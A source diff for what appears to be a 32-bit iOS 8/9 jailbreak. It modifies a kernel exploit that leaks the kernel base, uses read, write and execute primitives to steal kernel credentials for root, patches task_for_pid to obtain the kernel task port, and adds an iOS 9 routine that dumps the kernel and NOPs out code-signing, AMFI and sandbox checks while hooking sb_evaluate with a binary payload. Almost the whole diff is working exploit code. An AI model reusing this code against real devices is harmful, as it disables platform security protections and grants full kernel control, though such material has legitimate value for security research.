@@ -8,7 +8,6 @@
 #include <sys/syscall.h>
 #include <sys/kauth.h>
 #include <sys/mount.h>
-#include <sys/utsname.h>
 #include <spawn.h>
 #include <fcntl.h>
 #include <pthread.h>
@@ -16,6 +15,7 @@
 #include <mach/mach.h>
 #include <IOKit/IOKitLib.h>
 
+#include "offsets.h"
 #include "patchfinder.h"
 
 #define NEWFILE  (O_WRONLY|O_SYNC)
@@ -176,114 +176,6 @@ unsigned char uaf_payload_buffer[] = {
     0x00, 0x00, 0x00, 0x00, // [24] address of "BX LR" code fragment
 };
 
-
-enum koffsets {
-    offsetof_OSSerializer_serialize,   // OSSerializer::serialize
-    offsetof_OSSymbol_getMetaClass,    // OSSymbol::getMetaClass
-    offsetof_calend_gettime,           // calend_gettime
-    offsetof_bufattr_cpx,              // _bufattr_cpx
-    offsetof_clock_ops,                // clock_ops
-    offsetof_copyin,                   // _copyin
-    offsetof_bx_lr,                    // BX LR
-    offsetof_write_gadget,             // write_gadget: str r1, [r0, #0xc] , bx lr
-    offsetof_vm_kernel_addrperm,       // vm_kernel_addrperm
-    offsetof_kernel_pmap,              // kernel_pmap
-    offsetof_flush_dcache,             // flush_dcache
-    offsetof_invalidate_tlb,           // invalidate_tlb
-    offsetof_task_for_pid,             // task_for_pid
-    offsetof_pid_check,                // pid_check_addr offset
-    offsetof_posix_check,              // posix_check_ret_addr offset
-    offsetof_mac_proc_check,           // mac_proc_check_ret_addr offset
-    offsetof_allproc,                  // allproc
-    offsetof_p_pid,                  // proc_t::p_pid
-    offsetof_p_ucred,                // proc_t::p_ucred
-};
-
-uint32_t koffsets_S5L895xX_12H321[] = {
-    0x2d9864,   // OSSerializer::serialize
-    0x2db984,   // OSSymbol::getMetaClass
-    0x1d300,    // calend_gettime
-    0xc65f4,    // _bufattr_cpx
-    0x3b1cdc,   // clock_ops
-    0xb386c,    // _copyin
-    0xc65f6,    // BX LR
-    0xb35a8,    // write_gadget: str r1, [r0, #0xc] , bx lr
-    0x3f8258,   // vm_kernel_addrperm
-    0x3a711c,   // kernel_pmap
-    0xa7758,    // flush_dcache
-    0xb3600,    // invalidate_tlb
-    0x2c05c8,   // task_for_pid
-    0x16+2,     // pid_check_addr offset
-    0x3e,       // posix_check_ret_addr offset
-    0x222,      // mac_proc_check_ret_addr offset
-    0x3f9970,   // allproc
-    0x8,        // proc_t::p_pid
-    0x8c,       // proc_t::p_ucred
-};
-
-uint32_t koffsets_S5L894xX_12H321[] = {
-    0x2D4A1C,   // OSSerializer::serialize
-    0x2D6AFC,   // OSSymbol::getMetaClass
-    0x1D0A0,    // calend_gettime
-    0xC3718,    // _bufattr_cpx
-    0x3ACCDC,   // clock_ops
-    0xB1744,    // _copyin
-    0xC371A,    // BX LR
-    0xB1488,    // write_gadget: str r1, [r0, #0xc] , bx lr
-    0x3F3128,   // vm_kernel_addrperm
-    0x3A211C,   // kernel_pmap
-    0xA6D10,    // flush_dcache
-    0xB14E0,    // invalidate_tlb
-    0x2BBDD0,   // task_for_pid
-    0x16+2,     // pid_check_addr offset
-    0x3e,       // posix_check_ret_addr offset
-    0x222,      // mac_proc_check_ret_addr offset
-    0x3F4810,   // allproc
-    0x8,        // proc_t::p_pid
-    0x8c,       // proc_t::p_ucred
-};
-
-uint32_t koffset(enum koffsets offset){
-    if (offsets == NULL) {
-        return 0;
-    }
-    return offsets[offset];
-}
-
-void offsets_init(void){
-    struct utsname u = { 0 };
-    uname(&u);
-    
-    printf("kern.version: %s\n", u.version);
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8950X") == 0) {
-        printf("S5L8950X: 12H321\n");
-        offsets = koffsets_S5L895xX_12H321;
-        isA6 = 1;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:36 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8955X") == 0) {
-        printf("S5L8955X: 12H321\n");
-        offsets = koffsets_S5L895xX_12H321;
-        isA6 = 1;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:24 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8940X") == 0) {
-        printf("S5L8940X: 12H321\n");
-        offsets = koffsets_S5L894xX_12H321;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:26:26 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8942X") == 0) {
-        printf("S5L8942X: 12H321\n");
-        offsets = koffsets_S5L894xX_12H321;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:41 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8945X") == 0) {
-        printf("S5L8945X: 12H321\n");
-        offsets = koffsets_S5L894xX_12H321;
-    }
-}
-
 void init(void){
     
 #ifdef UNTETHER
@@ -395,6 +287,15 @@ uint32_t leak_kernel_base(void){
     } while (IORegistryEntryGetProperty(object, "HIDKeyboardModifierMappingSrc", data, &size));
     
     if (size > 8) {
+        int i;
+        for (i=0; i<size; i++) {
+            if (i % 4 == 0) {
+                //printf("\n");
+            }
+            //printf("%02x ", (unsigned char)data[i]);
+        }
+        //printf("\n");
+        
         return (*(uint32_t *)(data+36) & 0xFFF00000) + 0x1000;
     }
     return 0;
@@ -471,7 +372,14 @@ void *insert_payload(void *ptr) {
     } while (IORegistryEntryGetProperty(object, "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara", buffer, &size));
     
     if (size > 8) {
-        
+        int i;
+        for (i=0; i<size; i++) {
+            if (i % 4 == 0) {
+                //printf("\n");
+            }
+            //printf("%02x ", (unsigned char)buffer[i]);
+        }
+        //printf("\n");
         if(!isA6&&!isIOS9){
             payload_ptr = *(uint32_t *)(buffer+12); // ?
         } else {
@@ -552,6 +460,17 @@ void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_
     exec_primitive(flush_dcache, 0, 0);
     exec_primitive(invalidate_tlb, 0, 0);
     
+}
+
+void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
+    for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE) {
+        pointer_t buf = 0;
+        vm_address_t sz = 0;
+        vm_read(tfp0, addr, CHUNK_SIZE, &buf, &sz);
+        if (buf == 0 || sz == 0)
+            continue;
+        bcopy((uint8_t *)buf, dest + e, CHUNK_SIZE);
+    }
 }
 
 void do_exploit(uint32_t kernel_base){
@@ -648,7 +567,7 @@ void do_exploit(uint32_t kernel_base){
     printf("[*] tte_phys: %08x\n", tte_phys);
     
     pid_t uid = getuid();
-    if(uid != 0){
+    //if(uid != 0){
         // elevation to root privilege by xerub
         uint32_t kproc = 0;
         myproc = 0;
@@ -670,8 +589,7 @@ void do_exploit(uint32_t kernel_base){
         write_primitive(myproc + koffset(offsetof_p_ucred), kcred);
         setuid(0);
         printf("[*] I am god?: %x\n", getuid());
-    }
-    
+    //}
     
     /* task_for_pid */
     uint32_t task_for_pid_base = koffset(offsetof_task_for_pid) + kernel_base;
@@ -680,15 +598,21 @@ void do_exploit(uint32_t kernel_base){
     
     patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
     
-    write_primitive(pid_check_addr, 0xbf00bf00); // beq -> NOP
-    
+    //if(!isIOS9){
+    //    uint32_t pid_check_val = read_primitive(pid_check_addr);
+    //    pid_check_val |= 0xff;
+    //    write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
+    //} else {
+        write_primitive(pid_check_addr, 0xbf00bf00); // beq -> NOP
+    //}
+
     usleep(100000);
     
     uint32_t posix_check_ret_addr;
     uint32_t posix_check_ret_val;
     uint32_t mac_proc_check_ret_addr;
     uint32_t mac_proc_check_ret_val;
-    if(uid != 0){
+    //if(uid != 0){
         posix_check_ret_addr = koffset(offsetof_posix_check) + task_for_pid_base;
         posix_check_ret_val = read_primitive(posix_check_ret_addr);
         patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, posix_check_ret_addr & ~0xFFF);
@@ -698,7 +622,7 @@ void do_exploit(uint32_t kernel_base){
         mac_proc_check_ret_val = read_primitive(mac_proc_check_ret_addr);
         patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, mac_proc_check_ret_addr & ~0xFFF);
         write_primitive(mac_proc_check_ret_addr, mac_proc_check_ret_val | 0x10000); // cmp.w r8, #1
-    }
+    //}
     
     exec_primitive(flush_dcache, 0, 0);
     
@@ -707,24 +631,13 @@ void do_exploit(uint32_t kernel_base){
     task_for_pid(mach_task_self(), 0, &kernel_task);
     tfp0 = kernel_task;
     
-    if(uid != 0){
+    //if(uid != 0){
         write_primitive_dword_tfp0(posix_check_ret_addr, posix_check_ret_val);
         write_primitive_dword_tfp0(mac_proc_check_ret_addr, mac_proc_check_ret_val);
         exec_primitive(flush_dcache, 0, 0);
         usleep(100000);
-    }
+    //}
     
-}
-
-void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
-    for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE) {
-        pointer_t buf = 0;
-        vm_address_t sz = 0;
-        vm_read(tfp0, addr, CHUNK_SIZE, &buf, &sz);
-        if (buf == 0 || sz == 0)
-            continue;
-        bcopy((uint8_t *)buf, dest + e, CHUNK_SIZE);
-    }
 }
 
 void patch_bootargs(uint32_t addr){
@@ -971,6 +884,163 @@ void unjail8(uint32_t kbase){
     
 }
 
+void unjail9(uint32_t kbase){
+    printf("[*] jailbreaking...\n");
+    
+    printf("[*] running kdumper\n");
+    size_t ksize = 0xF00000;
+    void *kdata = malloc(ksize);
+    dump_kernel(kbase, kdata, ksize);
+     
+    /* patchfinder */
+    printf("[*] running patchfinder\n");
+    uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
+    uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
+    uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1_90(kbase, kdata, ksize);
+    uint32_t PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2_90(kbase, kdata, ksize);
+    uint32_t p_bootargs = kbase + find_p_bootargs_generic(kbase, kdata, ksize);
+    uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch(kbase, kdata, ksize);
+    uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
+    uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
+    uint32_t mount_patch = kbase + find_mount_90(kbase, kdata, ksize) + 1;
+    uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
+    uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
+    uint32_t sb_patch = kbase + find_sb_evaluate_90(kbase, kdata, ksize);
+    uint32_t memcmp_addr = find_memcmp(kbase, kdata, ksize);
+    uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
+    uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
+    uint32_t amfi_file_check_mmap = kbase + find_amfi_file_check_mmap(kbase, kdata, ksize);
+
+    printf("[PF] proc_enforce:               %08x\n", proc_enforce);
+    printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
+    printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
+    printf("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
+    printf("[PF] p_bootargs:                 %08x\n", p_bootargs);
+    printf("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
+    printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
+    printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
+    printf("[PF] mount_patch:                %08x\n", mount_patch);
+    printf("[PF] mapForIO:                   %08x\n", mapForIO);
+    printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
+    printf("[PF] sb_evaluate:                %08x\n", sb_patch);
+    printf("[PF] memcmp:                     %08x\n", memcmp_addr);
+    printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
+    printf("[PF] csops:                      %08x\n", csops_addr);
+    printf("[PF] amfi_file_check_mmap:       %08x\n", amfi_file_check_mmap);
+    
+    printf("[*] running kernelpatcher\n");
+    
+    /* proc_enforce: -> 0 */
+    write_primitive_dword_tfp0(proc_enforce, 0);
+    
+    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
+    write_primitive_byte_tfp0(cs_enforcement_disable_amfi, 1);
+    write_primitive_byte_tfp0(cs_enforcement_disable_amfi-1, 1);
+    
+    /* bootArgs */
+    patch_bootargs(p_bootargs);
+    
+    /* debug_enabled -> 1 */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_1 & ~0xFFF));
+    write_primitive_dword_tfp0(PE_i_can_has_debugger_1, 1);
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_2 & ~0xFFF));
+    write_primitive_dword_tfp0(PE_i_can_has_debugger_2, 1);
+    
+    /* vm_fault_enter */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_fault_enter & ~0xFFF));
+    write_primitive_word_tfp0(vm_fault_enter, 0x2201);
+    
+    /* vm_map_enter */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
+    write_primitive_dword_tfp0(vm_map_enter, 0xbf00bf00);
+    
+    /* vm_map_protect: set NOP */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_protect & ~0xFFF));
+    write_primitive_dword_tfp0(vm_map_protect, 0xbf00bf00);
+    
+    /* mount patch */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mount_patch & ~0xFFF));
+    write_primitive_byte_tfp0(mount_patch, 0xe7);
+    
+    /* mapForIO: prevent kIOReturnLockedWrite error */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mapForIO & ~0xFFF));
+    write_primitive_dword_tfp0(mapForIO, 0xbf00bf00);
+    
+    /* csops */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops_addr & ~0xFFF));
+    write_primitive_dword_tfp0(csops_addr, 0xbf00bf00);
+    
+    /* amfi_file_check_mmap */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (amfi_file_check_mmap & ~0xFFF));
+    write_primitive_dword_tfp0(amfi_file_check_mmap, 0xbf00bf00);
+    
+    /* sandbox */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sandbox_call_i_can_has_debugger & ~0xFFF));
+    write_primitive_dword_tfp0(sandbox_call_i_can_has_debugger, 0xbf00bf00);
+    
+    /* sb_evaluate */
+    unsigned char pangu9_payload[] = {
+        0x1f, 0xb5, 0xad, 0xf5, 0x82, 0x6d, 0x1c, 0x6b, 0x01, 0x2c, 0x34, 0xd1,
+        0x5c, 0x6b, 0x00, 0x2c, 0x31, 0xd0, 0x69, 0x46, 0x5f, 0xf4, 0x80, 0x60,
+        0x0d, 0xf5, 0x80, 0x62, 0x10, 0x60, 0x20, 0x46, 0x11, 0x11, 0x11, 0x11,
+        0x1c, 0x28, 0x01, 0xd0, 0x00, 0x28, 0x24, 0xd1, 0x68, 0x46, 0x17, 0xa1,
+        0x10, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x1d, 0xd0, 0x68, 0x46,
+        0x0f, 0xf2, 0x5c, 0x01, 0x13, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28,
+        0x0d, 0xd1, 0x68, 0x46, 0x18, 0xa1, 0x31, 0x22, 0x22, 0x22, 0x22, 0x22,
+        0x00, 0x28, 0x0e, 0xd0, 0x68, 0x46, 0x22, 0xa1, 0x27, 0x22, 0x22, 0x22,
+        0x22, 0x22, 0x00, 0x28, 0x07, 0xd1, 0x0d, 0xf5, 0x82, 0x6d, 0x01, 0xbc,
+        0x00, 0x21, 0x01, 0x60, 0x18, 0x21, 0x01, 0x71, 0x1e, 0xbd, 0x0d, 0xf5,
+        0x82, 0x6d, 0x05, 0x98, 0x86, 0x46, 0x1f, 0xbc, 0x01, 0xb0, 0xcc, 0xcc,
+        0xcc, 0xcc, 0xdd, 0xdd, 0xdd, 0xdd, 0x00, 0xbf, 0x2f, 0x70, 0x72, 0x69,
+        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x74, 0x6d, 0x70,
+        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
+        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x00, 0x2f, 0x70, 0x72, 0x69,
+        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62,
+        0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f,
+        0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x2f,
+        0x63, 0x6f, 0x6d, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x00, 0x00, 0xbf,
+        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
+        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72,
+        0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e,
+        0x63, 0x65, 0x73, 0x00, 0x02, 0x00, 0x00, 0x00
+    };
+    
+    uint32_t payload_base = 0xb00; // taig8
+    size_t payload_len = 0x110;
+    
+    uint32_t vn_getpath_bl = make_bl(payload_base+0x20, vn_getpath);
+    uint32_t memcmp_bl_1 = make_bl(payload_base+0x32, memcmp_addr);
+    uint32_t memcmp_bl_2 = make_bl(payload_base+0x42, memcmp_addr);
+    uint32_t memcmp_bl_3 = make_bl(payload_base+0x50, memcmp_addr);
+    uint32_t memcmp_bl_4 = make_bl(payload_base+0x5e, memcmp_addr);
+    uint32_t sb_evaluate_val = read_primitive_dword_tfp0(sb_patch);
+    uint32_t back_sb_evaluate = make_b_w(payload_base+0x86, (sb_patch+4-kbase));
+    
+    *(uint32_t*)(pangu9_payload+0x20) = vn_getpath_bl;
+    *(uint32_t*)(pangu9_payload+0x32) = memcmp_bl_1;
+    *(uint32_t*)(pangu9_payload+0x42) = memcmp_bl_2;
+    *(uint32_t*)(pangu9_payload+0x50) = memcmp_bl_3;
+    *(uint32_t*)(pangu9_payload+0x5e) = memcmp_bl_4;
+    *(uint32_t*)(pangu9_payload+0x82) = sb_evaluate_val;
+    *(uint32_t*)(pangu9_payload+0x86) = back_sb_evaluate;
+    
+    void* sandbox_payload = malloc(payload_len);
+    memcpy(sandbox_payload, pangu9_payload, payload_len);
+    
+    // hook sb_evaluate
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, ((kbase + payload_base) & ~0xFFF));
+    copyout((kbase + payload_base), sandbox_payload, payload_len);
+    
+    uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sb_patch & ~0xFFF));
+    write_primitive_dword_tfp0(sb_patch, sb_evaluate_hook);
+    
+    exec_primitive(flush_dcache, 0, 0);
+    
+    printf("enable patched.\n");
+    
+}
+
 void load_jb(void){
     
     // remount rootfs
@@ -1000,6 +1070,19 @@ void load_jb(void){
         chown("/.installed_daibutsu", 0, 0);
     }
     
+    
+    // afc2
+    //char *afc2d_path = "/usr/share/daibutsuAFC2/afc2d.dmg";
+    //char *afc2d_exec_path = "/usr/share/daibutsuAFC2/afcd2";
+    //FILE *fd = fopen(afc2d_path, "r");
+    //if (fd) {
+    //    fd = fopen(afc2d_exec_path, "r");
+    //    if (fd) {
+    //        posix_spawn(&pd, afc2d_exec_path, NULL, NULL, (char **)&(const char*[]){ afc2d_exec_path, NULL }, NULL);
+    //        waitpid(pd, NULL, 0);
+    //    }
+    //}
+    
     printf("[*] loading JB\n");
     // substrate: run "dirhelper"
     jl = "/bin/bash";
@@ -1018,14 +1101,17 @@ void load_jb(void){
     
     jl = "/usr/libexec/CrashHousekeeping_o";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, NULL }, NULL);
-    
+    if(isIOS9){
+        waitpid(pd, NULL, 0);
+    }
+
 #endif
     
 #ifdef RELOADER
     jl = "/usr/bin/killall";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "-9", "backboardd", NULL }, NULL);
 #endif
-    
+
 }
 
 void failed(void){
@@ -1049,8 +1135,11 @@ int main(void){
     if(tfp0){
         printf("[*] got tfp0: %x\n", tfp0);
         
-        unjail8(kernel_base);
-        
+        if(!isIOS9){
+            unjail8(kernel_base);
+        } else {
+            unjail9(kernel_base);
+        }
         load_jb();
         
     } else {
